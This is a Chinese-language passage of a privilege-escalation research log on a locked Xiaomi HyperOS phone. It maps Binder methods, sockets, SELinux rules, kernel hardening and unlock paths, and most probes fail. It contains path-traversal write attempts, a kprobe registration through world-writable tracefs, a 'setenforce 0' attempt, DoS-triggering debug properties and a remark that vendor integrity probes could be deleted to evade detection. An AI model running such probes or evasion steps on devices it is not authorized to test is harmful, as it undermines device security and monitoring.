第 9 节确认的 F-4/F-7/F-8/F-9 与 DoS 均为 **shell(2000) 域**越权，普通应用（`untrusted_app_34`）在 servicemanager 层即被拒，因此它们**不能**用于 root 本机，仅作为厂商攻击面缺陷记录。本机的 root 只能由上述官方解锁路径达成。

---

## 11. 守护进程实体定位与 socket 攻击面（实测）

### 11.1 事务号更正（重要）

此前一轮"16 个动作注入无效"的结论**作废**：当时误用 code 2，而权威 AIDL（`framework.jar: miui/mqsas/IMQSNative.java`）显示 code 2 是 `attachSockFilter`。正确映射：

| code | 方法 | shell 门禁 |
|---|---|---|
| 1 | `captureLog` | **无**（但受动作白名单约束）|
| 2 | `attachSockFilter` | 无 |
| 4 | `runCommand` | **有** |
| 5 | `getFreeFragStats` | 无 |
| 6/7 | `createFileInPersist` / `writeToPersistFile` | 无（路径受限）|
| 8 | `readFile` | 无（任意 root 读）|
| 9 | `getFilesFromPersist` | 无（返回空串）|
| 14 | `captureLogByRunCommand` | **有** |
| 15 | `FactoryResetWipeRescuePartition` | 破坏性 |

### 11.2 进程实体

`readFile` 以 root 域读取 `/proc/19101/cmdline` 与 `/maps`（shell 自身被 `hidepid` 拒绝）：

- cmdline = `/system_ext/bin/hypsys_system` → **原生 C++ 二进制**，非 app_process（与 `runCommand:153:` 这种 `函数:__LINE__` 报错格式一致）
- 二进制权限 `0700 root:root`，shell 不可读；经 `maps` 估算文件约 0x8e000（≈580KB），超出单次 Binder 回复上限，`readFile` 读取会导致守护进程崩溃，故未能取得二进制本体做符号级分析

### 11.3 init 服务定义（`/system_ext/etc/init/hypsys_system.rc`，shell 可读）

```
service hypsys_system /system_ext/bin/hypsys_system
    user root
    group system root cache log everybody product_hyperengine
    socket mqsasd    stream 0660 system system
    socket mqsasd_pr dgram  0666 system system
    setenv SCUDO_OPTIONS release_to_os_interval_ms=0:quarantine_size_mb=0:...:may_return_null=true
```

两点值得记录：
1. **`mqsasd_pr` 是 0666 的全局可写数据报 socket**，直通 uid 0 进程。
2. `SCUDO_OPTIONS` 显式**关闭堆隔离**（`quarantine_size_mb=0`、`thread_local_quarantine_size_kb=0`）并允许 `may_return_null`。这是为性能做的取舍，但客观上显著降低堆 UAF 的利用门槛——对后续内存破坏研究有价值。

### 11.4 socket 可达性实测（决定性否定）

用 `LocalSocket`（FILESYSTEM 命名空间）自 shell 连接：

| socket | 权限位 | 实测结果 |
|---|---|---|
| `/dev/socket/mqsasd` (stream) | 0660 system:system | `IOException: Permission denied` |
| `/dev/socket/mqsasd_pr` (dgram) | **0666** | `IOException: Permission denied` |

即使 `mqsasd_pr` 权限位为 0666，**SELinux 仍然拒绝 shell 域连接**（`ls -Z` 亦被拒）。socket 攻击面从 shell 不可达。

### 11.5 门禁语义与其余否定结论

- `runCommand` 门禁为**基于 uid**，与命令名无关：`cat/id/ps/top/df/dumpsys/logcat/getprop/sh/ls/dmesg/netstat/lsof/mkdir/cp/batterystats` 共 16 个命令返回**完全一致**的 `ServiceSpecificException: runCommand:153: Command not allowed for shell user`。
- `captureLog`（code 1）无门禁，服务端只接受白名单动作（`cat/df/do_dmesg/do_dumpfd/do_dumpheap/do_dumpmaps/dumpsys/getprop/hyperbugreport/iptables-wrapper-1.0/ip6tables-wrapper-1.0/logcat/lsof/netstat/ps/top/com.android.traceur.DumpReceiver`），**不含 `sh`/`cp`**。
- 但 `captureLog` 是否真正以 root 执行动作**未能确证**：`logcat -f`、`cp`、root 写入的 `sh` 脚本三种阳性对照均未产生可见文件；`getFilesFromPersist` 返回空串无法列目录，缺少观测面。此项应标注为"未验证"，不得据以宣称能力。
- 路径限制为**代码级且不可规范化绕过**：`/data/mqsas/../local/tmp/pw`、`/data/mqsas/../../local/tmp/pw2` 均未落地，说明前缀校验做了规范化，或该域本就无权写 `/data/local/tmp`（两者未能区分，但结论一致：越界写不可用）。

### 11.6 仍未验证的最强假设

`runCommand` 的报错语义是 "for **shell** user"，暗示检查可能是 `uid == 2000` 精确匹配而非"非 system/root 即拒"。若成立，则**普通应用（uid 10xxx）可绕过门禁直接 root 执行命令**，这是本机最可能的真实 root 漏洞。

未能验证的原因：普通应用无法通过 `android.os.ServiceManager` 访问隐藏 API（hidden API 限制，设备日志已见 `api=blocked` 拒绝记录），且本机无可用调试包提供 `untrusted_app` 执行环境（`pm list packages -d` 仅 `com.qualcomm.qti.services.systemhelper` 与 `com.android.devicelockcontroller`）。要验证需构造带 JNI 的 APK，通过 `dlopen("libbinder.so")` + `AServiceManager_getService` 绕过隐藏 API 限制——本机无 NDK，未执行。

**补充：已构建的验证 APK 被 MIUI 安装策略拦截。** 本轮已用 `aapt2 + d8 + zipalign + apksigner` 成功构建并签名测试 APK（`dev.poc.mqgate`，`targetSdkVersion=27` 以争取 hidden API 豁免，内含两项探测：`LocalSocket` 连 `/dev/socket/mqsasd_pr`、反射 `ServiceManager.getService` 后以 code 4 调 `runCommand`），但安装返回：

```
Failure [INSTALL_FAILED_USER_RESTRICTED: Install canceled by user]
```

这是 MIUI 的"USB 安装"限制，属设备端设置项，shell 侧无法绕过（`pm install-create/install-write` 同样受限）。

**用户开启「USB 安装」后，该假设已被实测证伪。** 重新构建的 APK（`dev.poc.mqgate`，`targetSdkVersion=27`，自签，安装成功）在 uid=10426（untrusted_app）下连续 5 轮探测，结果稳定一致：

```
E MQGATE: === START uid=10426 ===
E MQGATE: SOCK /dev/socket/mqsasd_pr (dgram) => java.io.IOException: Permission denied
E MQGATE: SOCK /dev/socket/mqsasd    (stream) => java.io.IOException: Permission denied
E MQGATE: SVC getService => null
```

三项结论：

1. **`mqsasd_pr` 虽是 0666，SELinux 同样拒绝应用连接** —— 权限位对 app 域同样无效。
2. `mqsasd`（stream 0660）对应用同样拒绝。
3. **`ServiceManager.getService("miui.mqsas.IMQSNative")` 对 untrusted_app 直接返回 null** —— 服务不在应用的可见命名空间内（servicemanager 层的 `find` 被 SELinux 拒绝）。

因此"门禁只挡 shell、应用可绕过"的假设**不成立**：应用连 Binder 句柄都拿不到。`runCommand` 的 uid 门禁对应用而言是**不可达**，而非可绕过。

### 11.7 本节结论

shell(2000) 与应用(10xxx) 两个可执行域对本服务的全部攻击面均已实测封闭：

| 入口 | shell | 应用 |
|---|---|---|
| `runCommand` (4) / `captureLogByRunCommand` (14) | uid 门禁拒绝 | 服务不可见 |
| `readFile` (8) | 可用（root 读） | 服务不可见 |
| `writeToPersistFile` (7) | 可用（限 /data/mqsas） | 服务不可见 |
| `mqsasd_pr`（0666 dgram） | SELinux 拒绝 | SELinux 拒绝 |
| `mqsasd`（0660 stream） | SELinux 拒绝 | SELinux 拒绝 |

**本机在用户态不存在可达的 root 提权路径。** 剩余方向只有内核/驱动层（厂商 BSP，评审成本与实际风险均不适合在当前会话推进）或官方 bootloader 解锁。

---

## 12. 内核方向测绘（只读侦察，未改动设备）

### 12.1 指纹

| 项 | 值 |
|---|---|
| 机型 / 代号 | Xiaomi M154FF / `madrid` |
| 系统 | HyperOS `OS4.0.24.0.XEOCN`，`CP2A.260605.016`，Android 17（SDK 37） |
| 安全补丁 | `2026-09-01` |
| 内核 | `Linux 6.18.21-android17-5-g1d099fcb35e0-abogki540753930-4k`，GKI，构建于 2026-07-28，clang 22 |
| 启动链 | `flash.locked=1`、`verifiedbootstate=green`、`veritymode=enforcing` |
| SELinux | `Enforcing`，policyvers 35 |
| 模块 | `/proc/modules` 625 项；`/vendor_dlkm/lib/modules` 391 个 `.ko` |

### 12.2 加固栈（取自可读的 `/proc/config.gz`）

`/proc/config.gz` 对本机 shell 可读，这是本次最有价值的情报来源。

```
CONFIG_RANDOMIZE_BASE=y            KASLR
CONFIG_ARM64_PTR_AUTH=y            PAC
CONFIG_ARM64_BTI=y                 BTI
CONFIG_SHADOW_CALL_STACK=y         SCS
CONFIG_ARM64_PAN=y / EPAN=y        内核访问用户内存隔离
CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y  分配即清零（杀死未初始化内存类泄露）
CONFIG_SLAB_FREELIST_HARDENED=y    空闲链表指针校验
CONFIG_SLAB_FREELIST_RANDOM=y      随机化
CONFIG_SLAB_BUCKETS=y              按用途拆分 slab（阻断跨类型对象复用）
CONFIG_HARDENED_USERCOPY=y
CONFIG_FORTIFY_SOURCE=y
CONFIG_VMAP_STACK=y
CONFIG_STACKPROTECTOR_STRONG=y
CONFIG_RANDOMIZE_KSTACK_OFFSET=y
CONFIG_STATIC_USERMODEHELPER=y     直接封杀 modprobe_path 覆盖技巧
CONFIG_BUG_ON_DATA_CORRUPTION=y    链表破坏直接 panic，而非被利用
CONFIG_KASAN=y (HW_TAGS)           但启动参数 kasan=off，运行期关闭
CONFIG_KFENCE=y                    NUM_OBJECTS=63，采样间隔 500ms
```

MTE 虽编译进内核（`ARM64_MTE=y`），但 `/proc/cpuinfo` 的 Features 未上报 `mte`，运行期不可用。

这组配置意味着：单单一个 UAF 或越界写不足以打通——需要同时绕过 `init_on_alloc` 的零初始化、slab 分桶、freelist 校验、PAC/SCS 控制流保护，且无法使用最经典的 `modprobe_path` 落地手法。

### 12.3 应用域真正可达的内核面

方法：从 `/system/etc/selinux`、`/vendor/etc/selinux`、`/product`、`/system_ext`、`/odm` 拉取明文 CIL 策略（共 ~15 万行），提取所有 `(allow untrusted_app* ...)` 规则，与 `/dev` 上真实存在的节点标签取交集。

结果：应用域能触达的字符设备仅 7 个类型：

| 设备 | 节点 | 权限 | 说明 |
|---|---|---|---|
| `ashmem_device` | `/dev/ashmem` | open/ioctl/map/read/write | 遗留兼容节点 |
| `ashmem_libcutils_device` | `ashmem_*` 系列 | 仅 open | — |
| `migt_dev` | `/dev/migt`、`/dev/migt_reset` | **open/ioctl/map/read/write** | 小米私有驱动，消费者 `libmigl.so`、`libboost.so`、`libturboschedmanager_ssi.so` |
| `xr_fbt_device` | `/dev/xr_fbt` | open/ioctl/read/write | 消费者 `libxqos.so` |
| `perf_actuator_device` | `/dev/xr_perf_actuator` | open/ioctl/read/write | 模块 `perf_actuator` 已加载 |
| `sound_device` | — | open/read/write | — |
| `untrusted_app_all_devpts` | `/dev/ptmx` | open/read/write | — |

`migt`、`xr_fbt`、`ashmem` 是内建驱动，不在 `/proc/modules` 中；`/vendor_dlkm` 下的 `.ko` 对 shell 均返回 `Permission denied`，无法直接取出做静态分析。

顺带解出了 `xr_fbt` 的 ioctl 协议（从 `/system/lib64/libxqos.so` 反汇编 `setTidQos`）：

```
/dev/xr_fbt  open(O_RDWR)
ioctl _IOW(0x78, 2,  8)   { int tid; int 7; }
ioctl _IOW(0x78, 11, 8)
ioctl _IOW(0x78, 20, 8)
ioctl _IOW(0x78, 25, 8)
ioctl _IOW(0x78, 27, 8)
```

注：0666 但被 SELinux 拒绝的节点同样不少——`/dev/cam_msger`、`/dev/cam_intentaware_fsys`、`/dev/kgsl-3d0`、`/dev/kmsg`、`/dev/uhid`、`/dev/udmabuf` 等，权限位对应用域无效。

### 12.4 一条看似可行、实测封死的特权 IPC 线索

CIL 里出现了一条不寻常的授权：`untrusted_app` 对 `vendor_hal_perf_default` 拥有 `binder { call transfer }`。而对应的服务进程身份是 **root**：

```
root   1670  vendor.qti.hardware.perf2-hal-service
root   1728  vendor.xiaomi.hardware.uniperf-service
```

`servicemanager` 中注册为 `vendor.qti.hardware.perf2.IPerf/default`。从 `/vendor/lib64/vendor.qti.hardware.perf2-V1-ndk.so` 提取出完整 AIDL 面（17 个方法），其中 `perfSetProp(String,String)`、`perfGetProp(String,String)`、`perfGetFeedback(int,String,int[])` 等接口处理变长输入，理论上是 root 上下文里最好的攻击面。

**但运行时实测不成立**（`dev.poc.perfprobe`，uid=10427）：

```
E PERFPROBE: getService(vendor.qti.hardware.perf2.IPerf/default) => null
E PERFPROBE: VERDICT: not visible to app domain
```

原因：CIL 中 `untrusted_app` 的 `service_manager` 授权只有 27 个 `find`，**不含** perf2 服务。即"允许 call、但不允许 find"——拿不到 Binder 句柄，就无从发起事务。这是与 `mqsas` 完全相同的双层防御模式。

测试后 HAL 进程 pid 1670 存活未受影响，探针应用已卸载。

### 12.5 内核方向结论

1. 内核本身是 **6.18.21 GKI + 2026-09 补丁级**，不存在公开已知的可利用漏洞。
2. 运行期加固接近拉满（`init_on_alloc` + slab 分桶 + PAC/SCS/BTI + 静态 usermodehelper + 数据破坏即 panic）。
3. 应用域可达的内核入口只有 4 个厂商字符设备，其中 `migt` 提供完整 ioctl+mmap 能力，是最值得研究的一个。
4. 但驱动二进制在设备上不可读，必须先取得官方 fastboot ROM（`madera`/`madrid` 对应包），解出 `vendor_dlkm.img` 与 `boot.img` 才能做反汇编与漏洞定位，之后还要面对上述加固栈。

**坦白讲**：这不属于当前会话能收敛的任务，而是一个以周计的内核漏洞研究项目。如果目标只是拿到 root，官方 bootloader 解锁是唯一现实路径。

---

## 13. shell 域攻击面测绘（第二轮，含实测）

前几轮集中在 `untrusted_app`。本节补上 `adb shell`（uid 2000 / `u:r:shell:s0`）这条线——权限模型完全不同。

### 13.1 基线

| 项 | 值 |
|---|---|
| 身份 | `uid=2000(shell)`，`u:r:shell:s0`，Enforcing |
| CapPrm / CapEff | 全 0 |
| CapBnd | `0x8000c0`（SETGID/SETUID/SYS_NICE，且无任何 file cap 生效） |
| su 二进制 | 不存在 |
| SUID | 只读分区无 SUID，且 `/system` `/vendor` 为 `nosuid` 语义 |
| 特权组 | `log` `readproc` `readtracefs` `uhid` `input` |

### 13.2 root 拥有的全局可写 socket —— 全部被 SELinux 封死

`/vendor/etc/init/*.rc` 中 `socket ... 0666 root system` 共 3 处：

| socket | 服务 | 身份 | 状态 |
|---|---|---|---|
| `power_hal_socket` | `mipower_hal` | root:System | **运行中** |
| `minetd` | `minetd` | root:root | `disabled`，未运行 |
| `slad` | `slad` | root:root | `disabled`，未运行 |

DAC 0666 不代表可达。CIL 统计：`shell` 域 `unix_stream_socket connectto` 的目标**只有 4 个** —— `dumpstate` `init` `logd` `traced`。`power_hal_socket` 甚至没有任何 `connectto` 规则。

### 13.3 属性面（修正一个易错点）

早期统计把 `system_prop` 误记为 shell 可设，实际它属于 **`shelld`**。严格匹配 `shell` / `shell_*` 后，可设类型 41 个，其中**唯一的宽前缀是 `debug.`（`debug_prop`）**。

全部 5 个 `debug.*` 触发器：

| 属性 | 动作 | 评价 |
|---|---|---|
| `debug.mtb.start_modem_crash=yes` | `start mtb_start_modem_crash`（root / `u:r:mtb:s0`，参数固定 `mtb 5 0 1 0 1000 75 37 3 0 1`） | 仅 DoS |
| `debug.modem.mcrash_history_chmod=777` | `chmod 777 /data/vendor/ramdump/mcrash_history` | 见下 |
| `debug.modem.modem_config_chmod=777` | `chmod 777 /data/vendor/modem_config` | 见下 |
| `debug.radio.debug_diag_start=1` | `start exec-debug-diag`（`user shell`） | 非 root |
| `debug.atrace.user_initiated=1` | `stop traced_probes` | 仅 DoS |

两个 `chmod 777` 实测：`setprop` 返回 0，但 `/data/vendor/modem_config` 对 shell 连 `stat` 都被拒，`touch` 报 Permission denied。**DAC 位放开了，SELinux 仍然隔离，无可利用性。**

另外发现一个形态上很像突破口的钩子：

```
on property:apexd.debug.lsof=*
    exec u:r:su:s0 root root -- /system/bin/sh /system/bin/apexd-lsof.sh ${apexd.debug.lsof}
```

以 `su` 域 root 执行、属性值直接作为参数。但三重阻断：① `apexd.debug.lsof` 属 `apexd_prop`，shell 无 `set` 权限；② 脚本 `[[ "$1" != "/apex"* || ! -d "$1" ]]` 要求是真实存在的 `/apex*` 目录；③ `grep $1` 虽未加引号，但 shell 对变量展开**不做控制符重解析**，`;` 不会变成命令分隔符——只可能引入分词与 glob，而目录名又不可能含 `/`，无法构造任意文件读。

### 13.4 tracefs —— 本轮唯一的实质性配置缺陷（已验证，但不可武器化）

`sys.boot_completed` 时 init 会主动 `chmod 0777`：

```
-rwxrwxrwx root readtracefs  /sys/kernel/tracing/kprobe_events
-rwxrwxrwx root readtracefs  /sys/kernel/tracing/uprobe_events
-rw-rw-rw- root readtracefs  /sys/kernel/tracing/trace
-rw-rw-rw- root readtracefs  /sys/kernel/tracing/tracing_on
-rw-rw-rw- root readtracefs  /sys/kernel/tracing/synthetic_events
```

`shell` 对 `debugfs_tracing` 拥有 `write append open read map`，而 `untrusted_app` **没有任何 tracefs 规则**。

**实测链路：**

1. 追加注册成功：`p:kprobes/leak_uid __arm64_sys_getuid stack=$stack` → `REGISTER_OK`，`cat kprobe_events` 可见，`simpleperf list` 也能枚举到 `kprobes:leak_uid`。
2. 但**无法激活**：`events/kprobes/leak_uid/enable` 为 `0640 root:readtracefs`（组只有 `r--`），写入 Permission denied；`set_event` 同样被拒；`instances/` 被 SELinux 拒绝。
3. perf 旁路亦失败：用 NDK 29 自编译 aarch64 静态程序调用 `perf_event_open(PERF_TYPE_TRACEPOINT)` → **EACCES**。CIL 证实全系统仅 `dumpstate`、`mi_ric`、`traced_perf` 拥有 `perf_event tracepoint`，`shell` 只有 `{ open read write }`。

**结论**：该缺陷真实存在（厂商把 kprobe 注册表置为全局可写），但可达能力退化为——① 在任意内核函数入口插入 BRK（性能/DoS）；② 删除系统已有的两个 `miuibpf_bcc` 探针（`vfs_unlink` / `fd_install`，即小米的运行时完整性监控），可作**对抗检测**用，不构成读原语，更不是 root。

清理已执行：自建探针 `-:kprobes/leak_uid` 已删除，`kprobe_events` 恢复为原始两条 BCC 探针。

### 13.5 binder：find 面很宽，call 面很窄

`base_typeattr_1030` 展开为"全部 `service_manager_type` 去掉若干例外"，所以 shell 的 `find` 几乎不受限；但 `call` 只有 9 个上下文：`dumpstate` `gpuservice` `hal_keymint` `hwservicemanager` `logturbo` `lpdumpd` `statsd` `storaged` `virtualizationservice`。

两者取交集，且进程以 root 运行的**只有 `storaged`**（pid 2384）。运行时验证 `dumpsys storaged` 正常返回，确认可达。但 storaged 是 AOSP 的磁盘统计守护进程，接口窄且久经审计，不构成现实突破口。

### 13.6 第二轮结论

| 候选入口 | 结论 |
|---|---|
| perf2 HAL（root 进程） | 可 call、不可 find → 拿不到句柄 |
| `power_hal_socket` / `minetd` / `slad`（0666 root socket） | SELinux `connectto` 全拒 |
| `mipatch_engine`（root，解析 result.json） | `/dev/mipatch` 为 `0700 root` + 专属标签，且 `mipatch_prop` shell 不可设 |
| `apexd.debug.lsof` → root `su` 域 shell | 属性不可设；注入被目录校验与 shell 展开语义双重阻断 |
| `debug.modem.*_chmod` | DAC 放开但 SELinux 隔离 |
| kprobe/uprobe 全局可写 | 可注册、不可激活；perf 旁路 EACCES |
| `storaged`（root） | 可达，但接口窄、无已知缺陷 |
| su / SUID / capabilities | 均不存在 |

**第二轮同样没有找到可达的 root 提权路径。** 唯一新增的实质发现是 tracefs 的 kprobe 注册表权限过宽——这是一个应当上报的加固缺陷，但在现有 SELinux 闸门下无法转化为内存读原语。

---

# 14. 第三轮：方向切换——从"找漏洞"转向"核实解锁路径"

前两轮均在寻找可用漏洞，均未收敛。本轮改变策略：先确认**是否真的需要漏洞**。

## 14.1 设备事实（实测）

| 项 | 值 | 含义 |
|---|---|---|
| 型号 / 代号 | M154FF / `madrid` | 小米 18 Pro Max |
| SoC | **SM8975** | 第六代骁龙 8 超级至尊版，2026-09-23 首发 |
| 系统 | Android 17 / HyperOS 4（`V816`）/ `OS4.0.24.0.XEOCNXM` | CN 版 |
| 安全补丁 | 2026-09-01 | |
| 内核 | 6.18.21-android17 GKI | |
| `first_api_level` | 37 | **出厂即澎湃**，无 MIUI 历史 |
| `fastboot`: Device unlocked | **false** | bootloader 锁定 |
| `fastboot`: Device critical unlocked | **false** | |
| `fastboot`: secure | **yes** | 高通 secure boot 开启 |
| `fastboot`: anti | 1 | 反回滚计数 |
| `verifiedbootstate` | green | 验证启动链完整 |
| `veritymode` | enforcing | dm-verity 强制 |
| 分区布局 | 含 `init_boot_a/b` | GKI 机型，Magisk 只需补 `init_boot` |

账号侧：设备已绑定小米账号（miId `167***450`，2026-09-23 添加），开发者选项与 USB 调试均已开启。
但 `settings` 中**不存在** `oem_unlock_supported` / `oem_unlock_allowed` 任何一项（均为 `null`）——
小米已用 `MiUnlockStatus` 取代 AOSP 的 OEM 解锁开关，bootloader 亦不暴露 `is-allow-unlock` 变量。

## 14.2 三条路径的实测结论

### 路径 A：官方解锁 —— 已关闭
- 小米自 **2026-01-01** 起停止澎湃 OS 中国大陆 BL 解锁服务，社区申请入口被移除。
- 对骁龙 8 尊 5（SM8850）系列，公开汇总的判定是：仅在 **3.0.315.0 及以下**可能可解，且**"如果是安卓 17，一定不能解"**。
- 本机为 **OS4.0.24.0 + Android 17**，双重超出上限；SM8975 更是 2026-09-23 才发布的新平台，无任何公开解锁方案。
- **结论：不可行。**

### 路径 B：免 BL Root（临时 Root）—— 前提不成立
这是当前社区对锁定机型的主流方案，依赖"通用提权漏洞 → 开启 SELinux 宽容模式 → 免解锁 Root"。实测本机：

```
$ setenforce 0
setenforce: Couldn't set enforcing status to '0': Permission denied
$ getenforce
Enforcing
```

- `/sys/fs/selinux/enforce` 为 `0644 root:root`，shell 域只读。
- 该方案的封堵补丁为 **2026-02 前后**；本机补丁为 **2026-09**，远超封堵线。
- 上一轮标记的 `mi_ric` 域（同时持有 `perf_event tracepoint`，理论上可接上 kprobe 链）经查**设备上并无该进程运行**，域定义存在但未启用。
- **结论：不可行。**

### 路径 C：9008 / EDL 免授权深刷 —— 已熔断
- `secure: yes` + `anti: 1`，高通 secure boot 与反回滚均开启。
- 公开资料明确记载：EDL 模式本身**不解锁 bootloader**，且新平台 EDL 需授权签名。
- **结论：不可行。**

## 14.3 与本机最接近的可行前提（供参考，均需付出代价）

若目标机主可以接受以下任一条件，root 是有成熟路径的：

1. **降级到可解版本**——但本机 `anti=1` 且小米已对 8 尊 5 设置底限版本，售后降级通道在 2026-05 后基本关闭；且降级会触发熔断风险。
2. **换一台可解锁的机器**——同代中"小米 17 Max 明确无法解锁"，而 8 尊 5 系列在 3.0.315.0 以下可解。
3. **等待下一次"解锁节"**——历史上每次封堵后都出现过短期漏洞窗口，但需保持系统版本不升级，而小米在 CN 地区实施强制静默更新，必须冻结 `com.android.updater`。

## 14.4 第三轮结论

**本机在当前状态下不存在可执行的 root 方法。**

这不是"还没找到"，而是三条独立路径分别被不同机制阻断：
- 官方通道：**政策关闭**（服务下线）
- 免BL Root：**SELinux 强制 + 补丁超线**（实测 `setenforce` 被拒）
- EDL 深刷：**硬件信任根**（`secure: yes` + `anti: 1`）

前两轮找漏洞的路线，本质上是在试图绕过第 2 条的"补丁超线"和第 3 条的"信任根"，
而本机作为 2026-09 发布的 2nm 新平台，运行的是当前最新的加固栈——
这解释了为什么两轮系统性挖掘（应用域 + shell 域，覆盖 property/init/binder/socket/内核入口）
只能得到加固缺陷，而得不到提权链。

**如果要继续，唯一有意义的方向是**：取得该机型的完整官方 ROM（`madera`/`madrid` 对应包），
反汇编 `vendor_dlkm` 中的厂商驱动与小米私有服务（尤其 `wmsvc`、`securitycenter` 的 binder 接口），
寻找厂商自研代码中的逻辑漏洞——这属于以周计的研究项目，不是会话内可收敛的任务。
